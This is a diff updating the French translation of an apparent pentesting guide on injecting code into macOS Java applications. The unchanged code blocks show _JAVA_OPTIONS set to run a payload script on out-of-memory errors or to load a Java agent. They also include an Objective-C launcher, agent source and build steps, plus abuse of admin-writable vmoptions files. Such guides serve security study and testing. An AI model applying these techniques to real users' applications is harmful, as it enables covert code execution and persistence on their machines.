@@ -1,10 +1,10 @@
-# Injection d'applications Java sur macOS
+# Injection dans les applications Java macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Énumération
 
-Trouvez les applications Java installées sur votre système. Il a été remarqué que les applications Java dans le **Info.plist** contiendront certains paramètres java qui contiennent la chaîne **`java.`**, vous pouvez donc rechercher cela :
+Trouvez les applications Java installées sur votre système. Il a été constaté que les applications Java présentes dans **Info.plist** contiennent certains paramètres Java incluant la chaîne **`java.`**. Vous pouvez donc effectuer une recherche sur celle-ci :
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-La variable d'environnement **`_JAVA_OPTIONS`** peut être utilisée pour injecter des paramètres java arbitraires dans l'exécution d'une application java compilée :
+La variable d’environnement **`_JAVA_OPTIONS`** peut être utilisée pour injecter des paramètres Java arbitraires lors de l’exécution d’une application compilée en Java :
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Pour l'exécuter en tant que nouveau processus et non en tant qu'enfant du terminal actuel, vous pouvez utiliser :
+Pour l’exécuter en tant que nouveau processus et non en tant qu’enfant du terminal actuel, vous pouvez utiliser :
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Cependant, cela déclenchera une erreur sur l'application exécutée, une autre méthode plus discrète consiste à créer un agent Java et à utiliser :
+Cependant, cela déclenchera une erreur dans l’application exécutée. Une autre méthode plus furtive consiste à créer un agent Java et à utiliser :
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Créer l'agent avec une **version Java différente** de l'application peut faire planter l'exécution de l'agent et de l'application
+> La création de l’agent avec une **version différente de Java** de celle de l’application peut entraîner le crash de l’agent et de l’application
 
-Où l'agent peut être :
+L’agent peut se trouver à l’emplacement suivant :
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,19 +102,19 @@ err.printStackTrace();
 }
 }
 ```
-Pour compiler l'agent, exécutez :
+Pour compiler l’agent, exécutez :
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Avec `manifest.txt` :
+Avec `manifest.txt`:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Et ensuite, exportez la variable d'environnement et exécutez l'application Java comme :
+Puis exportez la variable d'environnement et exécutez l'application Java comme suit :
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## fichier vmoptions
 
-Ce fichier prend en charge la spécification des **params Java** lors de l'exécution de Java. Vous pourriez utiliser certains des trucs précédents pour changer les params java et **faire exécuter des commandes arbitraires** au processus.\
-De plus, ce fichier peut également **inclure d'autres** avec le répertoire `include`, vous pourriez donc également changer un fichier inclus.
+Ce fichier prend en charge la spécification de **Java params** lors de l’exécution de Java. Vous pouvez utiliser certaines des techniques précédentes pour modifier les paramètres Java et **faire exécuter des commandes arbitraires au processus**.\
+De plus, ce fichier peut également **en inclure d’autres** avec le répertoire `include`, vous pouvez donc aussi modifier un fichier inclus.
 
-Encore plus, certaines applications Java **chargeront plus d'un fichier `vmoptions`**.
+Mieux encore, certaines applications Java vont **charger plusieurs fichiers `vmoptions`**.
 
-Certaines applications comme Android Studio indiquent dans leur **sortie où elles recherchent** ces fichiers, comme :
+Certaines applications, comme Android Studio, indiquent dans leur **output où elles recherchent** ces fichiers, par exemple :
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Certaines applications comme Android Studio indiquent dans leur **sortie où ell
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-S'ils ne le font pas, vous pouvez facilement vérifier cela avec :
+S'ils ne le font pas, vous pouvez facilement le vérifier avec :
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Notez à quel point il est intéressant qu'Android Studio dans cet exemple essaie de charger le fichier **`/Applications/Android Studio.app.vmoptions`**, un endroit où tout utilisateur du **`groupe admin` a un accès en écriture.** 
+Notez qu’il est intéressant de voir qu’Android Studio essaie de charger le fichier **`/Applications/Android Studio.app.vmoptions`**, un emplacement auquel tout utilisateur du **groupe `admin` dispose d’un accès en écriture.**
 
 {{#include ../../../banners/hacktricks-training.md}}
